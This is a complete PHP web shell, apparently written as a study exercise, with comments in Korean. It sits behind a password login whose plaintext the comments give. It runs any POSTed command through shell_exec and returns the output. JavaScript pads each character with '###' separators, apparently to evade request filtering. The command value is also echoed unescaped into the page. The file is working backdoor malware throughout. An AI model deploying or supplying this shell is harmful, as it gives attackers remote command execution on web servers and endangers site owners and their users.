<?
    @session_start();       # 세션: 사용자 식별
    
    $password = "123cf4be727c09936cacf35cd3720402";     # md5 hash화 "jshhack"
    $input_password = $_POST["password"];

    $page = $_SERVER["PHP_SELF"];
    $cmd = $_POST["cmd"];


    if(empty($_SESSION["webshell_id"]) && empty($input_password)) {  # 세션을 불러오는 슈퍼 변수(보통 id값으로 사용하기 때문에 중복 방지를 위해 다른 이름 사용[webshell])
        # password input form print
    ?>
        <form action="<?=$page?>" method="POST">
            <input type="password" name="password">
            <input type="submit" value="AUTH">
        </form>
    <?
    exit();     # 구문종료를 반드시해주어야 한다. 하지 않는다면, 아래 html까지 다 출력이 된다.
    } else if(empty($_SESSION["webshell_id"]) && !empty($input_password)) {
        if($password == md5($input_password)) {
            # Login Success!
            $_SESSION["webshell_id"] = "JSH";
            echo "<script>location.href='{$page}'</script>";
            exit();
        } else {
            echo "<script>location.href='{$page}'</script>";
            exit();
        }
    }
    if(!empty($cmd)) {
        $cmd = str_replace("###", "", $cmd);
        $result = shell_exec($cmd);
        $result = str_replace("\n",'<br>', $result);
    }
?>
<script>
    document.addEventListener("keydown", (event)=>{if(event.keyCode === 13){cmdRequest()}})
    function cmdRequest() {
        var frm = document.frm;
        var cmd = frm.cmd.value;
        var enc_cmd = "";

        for(i=0;i<cmd.length;i++) {
            enc_cmd += cmd.charAt(i) + "###";
        }
        frm.cmd.value = enc_cmd;
        frm.action="<?=$page?>";
        frm.submit();
    }
</script>
<form name="frm" method="POST">
    <input type="text" name="cmd" value="<?=$cmd?>">
    <input type="button" onclick="cmdRequest();" value="EXECUTE">
</form>
<hr>
<? if(!empty($cmd)) { ?>
    <table style="border: 1px solid black; background-color: black">
        <tr>
            <td style="color: white; font-size: 12px"><?=$result?></td>
        </tr>
    </table>
<? } ?>